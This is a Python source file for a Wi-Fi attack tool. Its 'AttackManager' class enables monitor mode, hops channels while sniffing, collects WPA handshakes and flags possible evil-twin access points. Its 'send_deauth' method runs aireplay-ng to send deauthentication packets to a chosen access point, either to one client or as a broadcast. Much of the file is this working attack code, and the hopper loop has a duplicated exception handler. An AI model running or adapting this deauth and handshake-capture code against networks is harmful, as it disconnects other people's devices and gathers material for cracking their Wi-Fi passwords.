import time
import random
import os
import subprocess
import threading
from backend.monitor_control import MonitorController
from backend.sniffer import PacketSniffer
from backend.channel_control import ChannelController
from backend.platform_wifi import IS_MACOS, IS_LINUX, AIRPORT_PATH, find_tool

# ===================================================================================
# CRITICAL: WIFI SCANNING LOGIC IS LOCKED. (STABLE CONFIGURATION - JAN 2026)
# DO NOT MODIFY CHANNEL HOPPING OR SCANNING LOGIC WITHOUT EXPLICIT "DOUBLE" USER APPROVAL.
# THE CURRENT INTERLEAVED HOPPING & SNIFFER RESTART STRATEGY IS OPTIMIZED FOR macOS.
# ===================================================================================

class AttackManager:
    def __init__(self, interface="en0"):
        self.interface = interface
        self.monitor = MonitorController(interface)
        self.channel_ctl = ChannelController(interface)
        self.sniffer = PacketSniffer(interface)
        self.hopping = False
        self.target_channel = None
        self.hop_thread = None
        self.current_channel = "IDLE" # Added for the new hopper logic

    def start_passive_scan(self):
        """
        Starts monitor mode, sniffing, and channel hopping.
        """
        if self.hopping:
            return

        # Reset Target
        self.target_channel = None

        # 1. Cleaner Setup
        try:
            if IS_MACOS:
                # Force disassociate
                subprocess.run([AIRPORT_PATH, "-z"], stderr=subprocess.DEVNULL)
                # Ensure interface is up
                subprocess.run(["networksetup", "-setairportpower", self.interface, "on"], stderr=subprocess.DEVNULL)
                time.sleep(1)
            else:
                # Linux: kill interfering processes
                subprocess.run(["airmon-ng", "check", "kill"], capture_output=True, timeout=10)
                time.sleep(0.5)
        except:
             pass

        print("Starting Passive Scan...")

        # Linux: explicitly enable monitor mode (airmon-ng)
        # macOS: tcpdump -I handles monitor mode internally
        if IS_LINUX:
            if not self.monitor.enable_monitor_mode():
                print("[!] Could not enable monitor mode on Linux.")
                return
            # Update all components to use monitor interface (wlan0mon)
            mon_iface = self.monitor.interface
            self.interface = mon_iface
            self.sniffer.interface = mon_iface
            self.channel_ctl.interface_name = mon_iface
            print(f"[+] Monitor mode active: {mon_iface}")

        # Start Sniffer
        self.sniffer.start()

        # 3. Start Channel Hopping
        if not self.hopping:
            self.hopping = True
            self.hop_thread = threading.Thread(target=self._channel_hopper)
            self.hop_thread.daemon = True
            self.hop_thread.start()

    def start_targeted_scan(self, channel):
        """
        Stops hopping and locks to a specific channel.
        Ensures Sniffer is running BEFORE setting channel.
        """
        print(f"Starting Targeted Scan on Channel {channel}...")
        self.hopping = False # Stop hopping loop
        self.target_channel = channel
        
        # 1. Ensure Sniffer is running (Don't restart if already up, to avoid downtime)
        # Actually, restart might be good to flush weird states, but let's try keeping it up
        if not self.sniffer.process:
             self.sniffer.start()
             time.sleep(1.5) # Wait for tcpdump to seize interface
        
        # 2. FORCE CHANNEL LOCK
        time.sleep(0.5)
        success = self.channel_ctl.set_channel(int(channel))
        if not success and IS_MACOS:
             print("CoreWLAN Channel Set failed, trying airport utility...")
             subprocess.run([AIRPORT_PATH, f"--channel={channel}"], stderr=subprocess.DEVNULL)

        print(f"Channel {channel} Locked.")

    def stop_scan(self):
        print("Stopping Scan...")
        self.hopping = False
        self.target_channel = None
        self.sniffer.stop()

        # Linux: restore monitor mode and restart NetworkManager
        if IS_LINUX:
            try:
                # Stop monitor mode (reverts wlan0mon -> wlan0)
                subprocess.run(["airmon-ng", "stop", self.interface],
                               capture_output=True, timeout=10)
                # Restore original interface name
                orig = self.monitor.original_interface
                self.interface = orig
                self.monitor.interface = orig
                self.sniffer.interface = orig
                self.channel_ctl.interface_name = orig
                # Bring interface back up
                subprocess.run(["ip", "link", "set", orig, "up"],
                               capture_output=True, timeout=5)
                # Restart NetworkManager
                subprocess.run(["systemctl", "start", "NetworkManager"],
                               capture_output=True, timeout=10)
                print(f"[+] NetworkManager restored. Interface: {orig}")
            except Exception as e:
                print(f"[!] Error restoring NetworkManager: {e}")

    def _channel_hopper(self):
        # Interleaved 2.4GHz and 5GHz list for faster initial discovery
        supported_channels = [
            # Priority (Common channels)
            1, 36, 6, 44, 11, 48, 
            # Mix rest
            2, 40, 3, 52, 4, 56, 5, 60, 7, 64, 8, 100, 9, 104, 10, 108, 12, 112, 13, 116,
            # Remaining 5GHz
            120, 124, 128, 132, 136, 140, 144, 149, 153, 157, 161, 165
        ]
        print(f"Channel Hopper Started. Scanning {len(supported_channels)} channels.")
        
        try:
            # Sequential Hopping
            hop_index = 0
            
            while self.hopping:
                try:
                    ch = supported_channels[hop_index]
                    hop_index = (hop_index + 1) % len(supported_channels)
                    
                    # Restart Sniffer on hop to force channel switch validity
                    # REQUIRED on macOS: tcpdump -I locks the channel. We must stop it to switch.
                    self.sniffer.stop()
                    time.sleep(0.1) # Brief pause
                    
                    success = self.channel_ctl.set_channel(ch)
                    if not success:
                         print(f"Skipping failed channel {ch}")
                         continue

                    self.current_channel = f"CH {ch}"
                    self.sniffer.start()
                    
                    # Stay on channel
                    time.sleep(2.0)
                    
                except Exception as e:
                    print(f"Channel Hop Error: {e}")
                    time.sleep(1)
                    
                except Exception as e:
                    print(f"Channel Hop Error: {e}")
                    time.sleep(1) # Prevent tight loop crash
        
        except Exception as e:
            print(f"CRITICAL: Hopper Thread Crash: {e}")
        finally:
            print("Channel Hopper Thread Exiting.")
            self.hopping = False

    def send_deauth(self, bssid, client=None, count=5):
        """
        Sends Deauth packets using aireplay-ng.
        """
        print(f"Sending {count} Deauths to {bssid} (Client: {client or 'BROADCAST'})...")
        
        # Resolve aireplay-ng path
        aireplay_path = find_tool("aireplay-ng")

        cmd = [aireplay_path, "-0", str(count), "-a", bssid]
        if client:
             cmd.extend(["-c", client])
        
        # Interface is last argument
        cmd.append(self.interface)
        
        try:
            # We run this non-blocking or blocking? 
            # Blocking is fine for a burst.
            subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
        except Exception as e:
            print(f"Deauth Error: {e}")

    def get_results(self):
        aps = self.sniffer.access_points
        
        # Evil Twin Detection Logic
        # 1. Group by SSID
        ssid_map = {}
        for bssid, data in aps.items():
            ssid = data.get("ssid")
            # Ignore hidden networks, empty strings, or nulls
            if ssid and ssid.lower() != "<hidden>" and ssid.strip() != "":
                if ssid not in ssid_map:
                    ssid_map[ssid] = []
                ssid_map[ssid].append(bssid)
        
        # 2. Flag duplicates
        for bssid, data in aps.items():
            ssid = data.get("ssid")
            # If SSID exists and appears in more than 1 BSSID -> Potential Evil Twin
            if ssid and ssid in ssid_map and len(ssid_map[ssid]) > 1:
                data["is_evil_twin"] = True
            else:
                data["is_evil_twin"] = False
 
        return {
            "aps": aps,
            "handshakes": self.sniffer.handshakes,
            "current_channel": self.target_channel if self.target_channel else ("HOPPING" if self.hopping else "IDLE")
        }
